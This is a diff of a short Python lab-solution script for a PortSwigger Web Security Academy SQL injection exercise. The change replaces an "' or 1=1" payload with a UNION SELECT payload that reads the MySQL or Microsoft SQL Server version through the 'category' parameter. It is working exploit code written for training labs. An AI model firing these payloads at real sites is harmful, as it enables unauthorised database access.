@@ -1,16 +1,16 @@
-#####################################################################
+##################################################################################
 #
 # Author: Ahmed Elqalawii
 #
-# Date: 12/9/2023
+# Date: 16/9/2023
 #
-# Lab: SQL injection vulnerability in WHERE clause allowing
-#      retrieval of hidden data
+# Lab: SQL injection attack, querying the database type and version on MySQL 
+#      and Microsoft
 #
 # Steps: 1. Inject payload in 'category' query parameter
-#        2. Retrieve all products without filtering
+#        2. Retrieve database version in the response
 #
-#####################################################################
+##################################################################################
 
 ###########
 # imports
@@ -21,15 +21,15 @@ from colorama import Fore
 #########
 # Main
 #########
-url = "https://0a620099038c27e7808c2623003800ad.web-security-academy.net" # change this url to your lab
+url = "https://0aed00c10379c81a830b55df0088004d.web-security-academy.net" # change this url to your lab
 try:
     # the payload to inject
-    payload = "' or 1=1-- -"
+    payload = "' UNION SELECT @@version, null-- -"
     # fetch the page with the injected payload
     inject = requests.get(f"{url}/filter?category={payload}")
     print(Fore.WHITE + "1. Injecting payload in 'category' query parameter.. " + Fore.GREEN + "OK")
     if inject.status_code == 200:
-        print(Fore.WHITE + "2. Retrieving all products without filtering.. " + Fore.GREEN + "OK")
+        print(Fore.WHITE + "2. Retrieving database version in the response.. " + Fore.GREEN + "OK")
         print(
             Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
     else:
